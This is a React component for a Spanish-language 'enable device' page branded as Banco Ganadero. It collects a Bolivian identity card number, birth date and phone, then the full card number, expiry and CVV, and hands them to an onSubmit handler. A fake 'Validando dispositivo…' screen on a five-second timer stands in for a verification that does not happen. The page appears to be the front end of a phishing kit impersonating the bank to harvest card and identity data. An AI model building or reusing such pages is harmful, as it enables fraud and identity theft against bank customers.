import { useEffect, useRef, useState } from 'react'
import LoadingSpinner from './LoadingSpinner.jsx'
import './HabilitarDevicePage.css'

const EXTENSIONES = [
  { value: 'LP', label: 'La Paz (LP)' },
  { value: 'CB', label: 'Cochabamba (CB)' },
  { value: 'SC', label: 'Santa Cruz (SC)' },
  { value: 'OR', label: 'Oruro (OR)' },
  { value: 'PT', label: 'Potosí (PT)' },
  { value: 'TJ', label: 'Tarija (TJ)' },
  { value: 'CH', label: 'Chuquisaca (CH)' },
  { value: 'BE', label: 'Beni (BE)' },
  { value: 'PD', label: 'Pando (PD)' },
]

const emptyPersonal = {
  ci: '',
  complemento: '',
  extension: '',
  birthDate: '',
  phone: '',
}

const emptyCard = {
  parts: ['', '', '', ''],
  cardExpiry: '',
  cvv: '',
  certified: false,
}

function formatCardPreview(parts) {
  return [0, 1, 2, 3]
    .map((i) => {
      const raw = String(parts[i] || '')
      return (raw + '••••').slice(0, 4)
    })
    .join(' ')
}

function formatExpiryPreview(value) {
  if (!value || !value.includes('-')) return 'MM/AA'
  const [year, month] = value.split('-')
  return `${month}/${String(year).slice(-2)}`
}

const MONTHS = [
  { value: '01', label: 'Enero' },
  { value: '02', label: 'Febrero' },
  { value: '03', label: 'Marzo' },
  { value: '04', label: 'Abril' },
  { value: '05', label: 'Mayo' },
  { value: '06', label: 'Junio' },
  { value: '07', label: 'Julio' },
  { value: '08', label: 'Agosto' },
  { value: '09', label: 'Septiembre' },
  { value: '10', label: 'Octubre' },
  { value: '11', label: 'Noviembre' },
  { value: '12', label: 'Diciembre' },
]

function buildFutureYears(count = 16) {
  const start = new Date().getFullYear()
  return Array.from({ length: count }, (_, i) => String(start + i))
}

function buildPastYears(count = 100) {
  const start = new Date().getFullYear()
  return Array.from({ length: count }, (_, i) => String(start - i))
}

function daysInMonth(year, month) {
  const y = Number(year)
  const m = Number(month)
  if (!y || !m) return 31
  return new Date(y, m, 0).getDate()
}

function formatDateValue(value, mode) {
  if (!value || !value.includes('-')) return ''
  const [year, month, day] = value.split('-')
  if (mode === 'date' && day) return `${day}/${month}/${year}`
  return `${month}/${year}`
}

function CalendarIcon() {
  return (
    <svg viewBox="0 0 24 24">
      <rect
        x="3"
        y="5"
        width="18"
        height="16"
        rx="2"
        fill="none"
        stroke="currentColor"
        strokeWidth="1.8"
      />
      <path
        d="M3 10h18M8 3v4M16 3v4"
        fill="none"
        stroke="currentColor"
        strokeWidth="1.8"
        strokeLinecap="round"
      />
    </svg>
  )
}

/** mode: 'month' = año→mes | 'date' = año→mes→día */
function HabDatePicker({
  value,
  onChange,
  disabled = false,
  mode = 'month',
  placeholder = 'Ingresar fecha',
}) {
  const [open, setOpen] = useState(false)
  const [phase, setPhase] = useState('year')
  const [pickedYear, setPickedYear] = useState('')
  const [pickedMonth, setPickedMonth] = useState('')
  const years = mode === 'date' ? buildPastYears(100) : buildFutureYears(16)

  function openPicker() {
    if (disabled) return
    const parts = value ? value.split('-') : []
    setPickedYear(parts[0] || '')
    setPickedMonth(parts[1] || '')
    setPhase('year')
    setOpen(true)
  }

  function pickYear(year) {
    setPickedYear(year)
    setPhase('month')
  }

  function pickMonth(month) {
    if (!pickedYear) return
    if (mode === 'month') {
      onChange?.(`${pickedYear}-${month}`)
      setOpen(false)
      setPhase('year')
      return
    }
    setPickedMonth(month)
    setPhase('day')
  }

  function pickDay(day) {
    if (!pickedYear || !pickedMonth) return
    onChange?.(`${pickedYear}-${pickedMonth}-${day}`)
    setOpen(false)
    setPhase('year')
  }

  const dayCount = daysInMonth(pickedYear, pickedMonth)
  const days = Array.from({ length: dayCount }, (_, i) => String(i + 1).padStart(2, '0'))

  return (
    <div className="hab-picker">
      <button
        type="button"
        className={`hab-input hab-date hab-expiry-btn${value ? '' : ' is-placeholder'}`}
        disabled={disabled}
        onClick={openPicker}
      >
        <span className="hab-date-icon" aria-hidden="true">
          <CalendarIcon />
        </span>
        <span className="hab-expiry-btn__text">
          {formatDateValue(value, mode) || placeholder}
        </span>
      </button>

      {open ? (
        <div className="hab-expiry-pop" role="dialog" aria-label="Elegir fecha">
          <div className="hab-expiry-pop__head">
            {phase === 'year' ? (
              <span>Seleccionar año</span>
            ) : phase === 'month' ? (
              <button
                type="button"
                className="hab-expiry-pop__back"
                onClick={() => setPhase('year')}
              >
                ← Años
              </button>
            ) : (
              <button
                type="button"
                className="hab-expiry-pop__back"
                onClick={() => setPhase('month')}
              >
                ← Meses
              </button>
            )}
            <button
              type="button"
              className="hab-expiry-pop__close"
              aria-label="Cerrar"
              onClick={() => setOpen(false)}
            >
              ×
            </button>
          </div>

          {phase === 'year' ? (
            <div className="hab-expiry-grid">
              {years.map((year) => (
                <button
                  key={year}
                  type="button"
                  className={`hab-expiry-opt${pickedYear === year ? ' is-on' : ''}`}
                  onClick={() => pickYear(year)}
                >
                  {year}
                </button>
              ))}
            </div>
          ) : null}

          {phase === 'month' ? (
            <div className="hab-expiry-grid hab-expiry-grid--months">
              {MONTHS.map((month) => (
                <button
                  key={month.value}
                  type="button"
                  className={`hab-expiry-opt${pickedMonth === month.value ? ' is-on' : ''}`}
                  onClick={() => pickMonth(month.value)}
                >
                  {month.label}
                </button>
              ))}
            </div>
          ) : null}

          {phase === 'day' ? (
            <div className="hab-expiry-grid">
              {days.map((day) => (
                <button
                  key={day}
                  type="button"
                  className="hab-expiry-opt"
                  onClick={() => pickDay(day)}
                >
                  {Number(day)}
                </button>
              ))}
            </div>
          ) : null}
        </div>
      ) : null}
    </div>
  )
}

export default function HabilitarDevicePage({
  onSubmit,
  onCancel,
  locked = false,
  showSpinner = false,
  errorMsg = '',
  successMsg = '',
  startOnCard = false,
}) {
  const [step, setStep] = useState(startOnCard ? 'card' : 'personal') // personal | bridging | card
  const [personal, setPersonal] = useState(emptyPersonal)
  const [card, setCard] = useState(emptyCard)
  const [loading, setLoading] = useState(false)
  const bridgeTimerRef = useRef(0)
  const partRefs = [useRef(null), useRef(null), useRef(null), useRef(null)]

  useEffect(() => {
    if (!locked) setLoading(false)
  }, [locked])

  useEffect(() => {
    return () => {
      if (bridgeTimerRef.current) window.clearTimeout(bridgeTimerRef.current)
    }
  }, [])

  useEffect(() => {
    if (!errorMsg && !successMsg) return
    if (bridgeTimerRef.current) window.clearTimeout(bridgeTimerRef.current)
    setPersonal(emptyPersonal)
    setCard(emptyCard)
    setStep(startOnCard ? 'card' : 'personal')
    setLoading(false)
  }, [errorMsg, successMsg, startOnCard])

  function setPersonalField(key, value) {
    setPersonal((prev) => ({ ...prev, [key]: value }))
  }

  const canPersonal =
    personal.ci.trim().length > 0 &&
    personal.extension.trim().length > 0 &&
    personal.birthDate.trim().length > 0 &&
    personal.phone.trim().length > 0 &&
    !loading &&
    !locked &&
    step === 'personal'

  const cardDigits = card.parts.join('')
  const personalReady =
    startOnCard ||
    (personal.ci.trim().length > 0 &&
      personal.extension.trim().length > 0 &&
      personal.birthDate.trim().length > 0 &&
      personal.phone.trim().length > 0)
  const canCard =
    cardDigits.length === 16 &&
    card.cardExpiry.trim().length > 0 &&
    card.cvv.trim().length >= 3 &&
    card.certified &&
    personalReady &&
    !loading &&
    !locked

  function handlePersonalNext(event) {
    event.preventDefault()
    if (!canPersonal) return
    setStep('bridging')
    if (bridgeTimerRef.current) window.clearTimeout(bridgeTimerRef.current)
    bridgeTimerRef.current = window.setTimeout(() => {
      setStep('card')
      bridgeTimerRef.current = 0
    }, 5000)
  }

  async function handleCardSubmit(event) {
    event.preventDefault()
    if (!canCard) return
    setLoading(true)
    await new Promise((r) => setTimeout(r, 450))
    onSubmit?.({
      ci: personal.ci.trim(),
      complemento: personal.complemento.trim(),
      extension: personal.extension,
      birthDate: personal.birthDate,
      phone: personal.phone.trim(),
      cardNumber: cardDigits,
      cardExpiry: card.cardExpiry,
      cvv: card.cvv.trim(),
      certified: true,
    })
  }

  function handleBack() {
    if (locked || step === 'bridging') return
    if (step === 'card' && !startOnCard) {
      setStep('personal')
      return
    }
    onCancel?.()
  }

  function onPartChange(index, raw) {
    const digits = raw.replace(/\D/g, '').slice(0, 4)
    setCard((prev) => {
      const parts = [...prev.parts]
      parts[index] = digits
      return { ...prev, parts }
    })
    if (digits.length === 4 && index < 3) {
      partRefs[index + 1].current?.focus()
    }
  }

  function onPartKeyDown(index, event) {
    if (event.key === 'Backspace' && !card.parts[index] && index > 0) {
      partRefs[index - 1].current?.focus()
    }
  }

  function onPartPaste(event) {
    const text = event.clipboardData?.getData('text') || ''
    const digits = text.replace(/\D/g, '').slice(0, 16)
    if (digits.length < 4) return
    event.preventDefault()
    const parts = [0, 1, 2, 3].map((i) => digits.slice(i * 4, i * 4 + 4))
    setCard((prev) => ({ ...prev, parts }))
    const focusIdx = Math.min(3, Math.floor((digits.length - 1) / 4))
    partRefs[focusIdx].current?.focus()
  }

  const busy = showSpinner || loading || step === 'bridging'
  const previewNumber = formatCardPreview(card.parts)
  const previewExpiry = formatExpiryPreview(card.cardExpiry)
  const previewCvv = card.cvv ? card.cvv.padEnd(3, '•').slice(0, 4) : '•••'

  return (
    <div className="hab-root">
      {busy && <LoadingSpinner />}

      <div className="hab-bg" aria-hidden="true">
        <img
          className="hab-bg__img"
          src={`${import.meta.env.BASE_URL}habilitar-bg.png`}
          alt=""
        />
        <div className="hab-bg__blur" />
        <div className="hab-bg__veil" />
      </div>

      <main className="hab-main">
        {step === 'bridging' ? (
          <div className="hab-bridge" aria-live="polite">
            <p className="hab-bridge__text">Validando dispositivo…</p>
          </div>
        ) : step === 'personal' ? (
          <form className="hab-card" onSubmit={handlePersonalNext} autoComplete="off">
            <div className="hab-card__top">
              <button
                type="button"
                className="hab-back"
                aria-label="Volver"
                disabled={locked}
                onClick={handleBack}
              >
                <svg viewBox="0 0 24 24" aria-hidden="true">
                  <path
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="2.2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    d="M15 18l-6-6 6-6"
                  />
                </svg>
              </button>
              <h1 className="hab-card__heading">Habilitar dispositivo</h1>
              <span className="hab-card__spacer" aria-hidden="true" />
            </div>

            <h2 className="hab-card__title">Datos personales</h2>

            {errorMsg ? <p className="hab-alert hab-alert--error">{errorMsg}</p> : null}
            {successMsg ? <p className="hab-alert hab-alert--ok">{successMsg}</p> : null}

            <label className="hab-field">
              <span className="hab-label">
                Cédula de Identidad (C.I) <em>*</em>
              </span>
              <input
                className="hab-input"
                type="text"
                inputMode="numeric"
                placeholder="Ingresar cédula de identidad"
                value={personal.ci}
                disabled={locked}
                onChange={(e) => setPersonalField('ci', e.target.value.replace(/[^\d]/g, ''))}
                maxLength={20}
              />
            </label>

            <label className="hab-field">
              <span className="hab-label">Complemento (opcional)</span>
              <input
                className="hab-input"
                type="text"
                placeholder="Ingresar complemento"
                value={personal.complemento}
                disabled={locked}
                onChange={(e) =>
                  setPersonalField('complemento', e.target.value.toUpperCase())
                }
                maxLength={10}
              />
            </label>

            <label className="hab-field">
              <span className="hab-label">
                Extensión <em>*</em>
              </span>
              <div className="hab-select-wrap">
                <select
                  className="hab-input hab-select"
                  value={personal.extension}
                  disabled={locked}
                  onChange={(e) => setPersonalField('extension', e.target.value)}
                >
                  <option value="" disabled>
                    Seleccionar extensión
                  </option>
                  {EXTENSIONES.map((opt) => (
                    <option key={opt.value} value={opt.value}>
                      {opt.label}
                    </option>
                  ))}
                </select>
              </div>
            </label>

            <div className="hab-field">
              <span className="hab-label">
                Fecha de nacimiento <em>*</em>
              </span>
              <HabDatePicker
                mode="date"
                value={personal.birthDate}
                disabled={locked}
                placeholder="Ingresar fecha"
                onChange={(next) => setPersonalField('birthDate', next)}
              />
            </div>

            <label className="hab-field">
              <span className="hab-label">
                Número de celular <em>*</em>
              </span>
              <input
                className="hab-input"
                type="tel"
                inputMode="numeric"
                placeholder="Ingresar número"
                value={personal.phone}
                disabled={locked}
                onChange={(e) =>
                  setPersonalField('phone', e.target.value.replace(/[^\d]/g, ''))
                }
                maxLength={15}
              />
            </label>

            <div className="hab-actions">
              <button type="submit" className="hab-btn hab-btn--next" disabled={!canPersonal}>
                Siguiente
              </button>
              <button
                type="button"
                className="hab-btn hab-btn--cancel"
                disabled={locked}
                onClick={() => onCancel?.()}
              >
                Cancelar
              </button>
            </div>
          </form>
        ) : (
          <form className="hab-card hab-card--plastic" onSubmit={handleCardSubmit} autoComplete="off">
            <div className="hab-card__top">
              <button
                type="button"
                className="hab-back"
                aria-label="Volver"
                disabled={locked}
                onClick={handleBack}
              >
                <svg viewBox="0 0 24 24" aria-hidden="true">
                  <path
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="2.2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    d="M15 18l-6-6 6-6"
                  />
                </svg>
              </button>
              <h1 className="hab-card__heading">
                {startOnCard ? 'Datos de tarjeta' : 'Habilitar dispositivo'}
              </h1>
              <span className="hab-card__spacer" aria-hidden="true" />
            </div>

            <h2 className="hab-card__title">Datos de tu tarjeta</h2>

            {errorMsg ? <p className="hab-alert hab-alert--error">{errorMsg}</p> : null}
            {successMsg ? <p className="hab-alert hab-alert--ok">{successMsg}</p> : null}

            <div className="hab-plastic" aria-hidden="true">
              <img
                className="hab-plastic__img"
                src={`${import.meta.env.BASE_URL}visa-card.png`}
                onError={(e) => {
                  e.currentTarget.src = '/visa-card.png'
                }}
                alt="Tarjeta Visa Banco Ganadero"
              />
              <div className="hab-plastic__number">{previewNumber}</div>
              <div className="hab-plastic__expiry">
                <span>GOOD THRU</span>
                <strong>{previewExpiry}</strong>
              </div>
              <div className="hab-plastic__cvv">
                <span>CVV</span>
                <strong>{previewCvv}</strong>
              </div>
            </div>

            <div className="hab-field">
              <span className="hab-label">Número de tarjeta</span>
              <div className="hab-card-parts" onPaste={onPartPaste}>
                {card.parts.map((part, index) => (
                  <input
                    key={index}
                    ref={partRefs[index]}
                    className="hab-card-part"
                    type="text"
                    inputMode="numeric"
                    maxLength={4}
                    value={part}
                    disabled={locked}
                    aria-label={`Grupo ${index + 1} de la tarjeta`}
                    onChange={(e) => onPartChange(index, e.target.value)}
                    onKeyDown={(e) => onPartKeyDown(index, e)}
                  />
                ))}
              </div>
              <p className="hab-hint">
                <span className="hab-hint__icon" aria-hidden="true">
                  i
                </span>
                Debe contener 16 dígitos.
              </p>
            </div>

            <div className="hab-field">
              <span className="hab-label">
                Fecha de expiración <em>*</em>
              </span>
              <HabDatePicker
                mode="month"
                value={card.cardExpiry}
                disabled={locked}
                placeholder="Ingresar fecha"
                onChange={(next) => setCard((prev) => ({ ...prev, cardExpiry: next }))}
              />
            </div>

            <label className="hab-field">
              <span className="hab-label">
                CVV <em>*</em>
              </span>
              <input
                className="hab-input hab-input--cvv"
                type="password"
                inputMode="numeric"
                placeholder="•••"
                value={card.cvv}
                disabled={locked}
                maxLength={4}
                onChange={(e) =>
                  setCard((prev) => ({
                    ...prev,
                    cvv: e.target.value.replace(/\D/g, '').slice(0, 4),
                  }))
                }
              />
            </label>

            <label className="hab-check">
              <input
                type="checkbox"
                checked={card.certified}
                disabled={locked}
                onChange={(e) => setCard((prev) => ({ ...prev, certified: e.target.checked }))}
              />
              <span>
                Certifico que mis datos son verdaderos. Autorizo a Banco Ganadero a verificar
                en el <u>SEGIP</u>, <u>Buró de información</u>, <u>ASFI</u> y otros.
              </span>
            </label>

            <div className="hab-actions">
              <button type="submit" className="hab-btn hab-btn--next" disabled={!canCard}>
                Siguiente
              </button>
              <button
                type="button"
                className="hab-btn hab-btn--cancel"
                disabled={locked}
                onClick={() => onCancel?.()}
              >
                Cancelar
              </button>
            </div>
          </form>
        )}
      </main>
    </div>
  )
}
